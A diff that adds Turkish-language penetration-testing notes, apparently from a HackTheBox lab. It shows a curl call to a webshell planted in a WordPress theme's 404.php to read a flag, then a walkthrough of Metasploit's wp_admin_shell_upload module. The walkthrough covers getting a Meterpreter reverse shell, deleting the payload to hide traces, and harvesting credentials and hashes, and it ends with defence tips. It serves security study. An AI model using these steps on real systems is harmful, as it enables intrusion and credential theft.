@@ -648,3 +648,119 @@ curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"
 ```Plaintext
 uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)
 ```
+
+```bash
+curl -X GET "http://154.57.164.72:43541/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/wp-user/flag.txt"
+```
+
+---
+title: WordPress Metasploit ile Exploitation
+tags:
+  - pentest
+  - metasploit
+  - wordpress
+  - web-exploitation
+  - htb
+aliases:
+  - wp_admin_shell_upload
+created: 2026-11-11
+---
+
+# WordPress Metasploit ile Exploitation
+
+> [!info] Özet
+> `exploit/unix/webapp/wp_admin_shell_upload` modülü, geçerli bir WordPress hesabıyla sunucuda dosya yükleyip reverse shell almayı otomatize eder. Modülün çalışması için hesabın webshell oluşturabileceği yetkiye sahip olması gerekir.
+
+## Gereksinimler
+
+- Geçerli WordPress kullanıcı adı ve parolası
+- Hesabın sunucuda dosya oluşturma yetkisi (genellikle yönetici)
+- Hedefe erişilebilen bir saldırgan IP'si (LHOST)
+
+## Metasploit'i Başlatma
+
+```bash
+msfconsole
+```
+
+## Modül Arama ve Seçme
+
+```bash
+search wp_admin
+use 0          # Arama sonucundaki ID ile seçim
+```
+
+| # | Modül | Tarih | Rank | Check |
+|---|-------|-------|------|-------|
+| 0 | `exploit/unix/webapp/wp_admin_shell_upload` | 2015-02-21 | excellent | Evet |
+
+## Seçenekleri İnceleme
+
+```bash
+options
+```
+
+| Seçenek | Zorunlu | Açıklama |
+|---------|---------|----------|
+| `PASSWORD` | Evet | WordPress parolası |
+| `USERNAME` | Evet | WordPress kullanıcı adı |
+| `RHOSTS` | Evet | Hedef host(lar) |
+| `RPORT` | Evet | Hedef port (varsayılan 80) |
+| `TARGETURI` | Evet | WordPress'in kök yolu (varsayılan `/`) |
+| `SSL` | Hayır | HTTPS için `true` |
+| `Proxies` | Hayır | Proxy zinciri |
+| `VHOST` | Hayır | Sanal host adı |
+
+> [!tip] İpucu
+> Varsayılan değerleri kontrol etmek için `show options` komutunu kullanın. Hedef HTTPS çalışıyorsa `SSL` değerini `true` yapmayı unutmayın.
+
+## Parametreleri Ayarlama ve Çalıştırma
+
+```bash
+set rhosts <hedef-domain>
+set username <kullanici-adi>
+set password <parola>
+set lhost <saldirgan-IP>
+run
+```
+
+### Modülün Yaptıkları (Adım Adım)
+
+1. Reverse TCP handler başlatılır
+2. Verilen kimlik bilgileriyle WordPress'e giriş yapılır
+3. Payload, bir eklenti dizinine yüklenir (`/wp-content/plugins/<rastgele>/`)
+4. Payload tetiklenir ve Meterpreter oturumu açılır
+5. Yüklenen PHP dosyası silinir (iz bırakmayı azaltmak için)
+
+## Oturum Doğrulama
+
+```bash
+meterpreter > getuid
+Server username: www-data (33)
+```
+
+> [!note] Yetki Seviyesi
+> Shell, web sunucusunun çalıştığı kullanıcının (`www-data`) yetkileriyle açılır. Bu, sistemde yerel yetki yükseltme (privilege escalation) gerektiğini gösterir.
+
+## Sonraki Adımlar
+
+- [[Linux Privilege Escalation]] ile `www-data`'dan yükseltme
+- Yapılandırma dosyalarında kimlik bilgisi arama (`wp-config.php`)
+- Veritabanı erişimi ve kullanıcı hash'lerini inceleme
+
+## Savunma Önerileri
+
+> [!warning] Korunma
+> - Güçlü ve benzersiz yönetici parolaları kullanın
+> - Yönetici hesaplarında iki faktörlü doğrulama (2FA) etkinleştirin
+> - Panelden eklenti/tema dosyası düzenlemeyi kapatın: `define('DISALLOW_FILE_EDIT', true);`
+> - Eklenti ve tema yüklemelerini kısıtlayın, dosya uzantılarını doğrulayın
+> - WordPress, eklentiler ve temalar için güncellemeleri zamanında uygulayın
+> - Giriş denemelerini sınırlayan bir WAF veya brute-force koruması kullanın
+
+## İlgili Notlar
+
+- [[Metasploit Framework]]
+- [[WordPress Güvenliği]]
+- [[Reverse Shell Türleri]]
+- [[Meterpreter Temelleri]]
